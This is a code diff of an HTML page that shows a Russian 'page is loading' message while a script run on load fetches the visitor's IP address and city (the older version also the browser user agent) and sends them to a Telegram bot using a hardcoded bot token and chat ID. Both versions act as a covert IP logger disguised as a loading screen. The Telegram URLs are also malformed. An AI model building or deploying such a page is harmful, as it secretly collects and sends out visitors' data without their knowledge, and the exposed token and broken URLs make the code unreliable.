@@ -1,54 +1,33 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <title>Загрузка...</title>
-</head>
+<head><meta charset="UTF-8"></head>
 <body>
-    <h1 id="status">Страница загружается, подождите... (v2.1)</h1>
+    <h1 id="status">Страница загружается... (v3.0)</h1>
 
     <script>
-        async function sendData() {
-            // Твой токен и ID (строго в одну строку)
+        async function run() {
             const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
             const chat_id = "8426763446";
 
             try {
-                // 1. Получаем данные (ОБЯЗАТЕЛЬНО /json/ в конце)
-                const response = await fetch('https://ipapi.co');
-                const data = await response.json();
+                // 1. Получаем IP (ОБЯЗАТЕЛЬНО /json/ в конце)
+                const res = await fetch('https://ipapi.co');
+                const data = await res.json();
 
                 // 2. Формируем сообщение
-                const message = `🚀 Новый переход!\n📍 IP: ${data.ip}\n🌍 Город: ${data.city}\n📱 Устройство: ${navigator.userAgent}`;
+                const text = `IP: ${data.ip} | City: ${data.city}`;
 
-                // 3. Отправляем в Telegram (ОБЯЗАТЕЛЬНО /sendMessage в конце)
-                const url = `https://api.telegram.org{token}/sendMessage`;
+                // 3. Отправляем в ТГ (ИСПРАВЛЕННЫЙ URL с /bot и /sendMessage)
+                const url = `https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
 
-                const res = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chat_id,
-                        text: message
-                    })
-                });
-
-                const result = await res.json();
-
-                if (result.ok) {
-                    document.getElementById('status').innerText = "Готово! Проверь Telegram.";
-                } else {
-                    document.getElementById('status').innerText = "Ошибка бота: " + result.description;
-                }
-
-            } catch (error) {
-                document.getElementById('status').innerText = "Ошибка сети: " + error;
-                console.error(error);
+                await fetch(url);
+                document.getElementById('status').innerText = "Готово! Сообщение в Telegram.";
+            } catch (e) {
+                document.getElementById('status').innerText = "Ошибка: " + e;
+                console.error(e);
             }
         }
-
-        // Запуск
-        sendData();
+        run();
     </script>
 </body>
 </html>
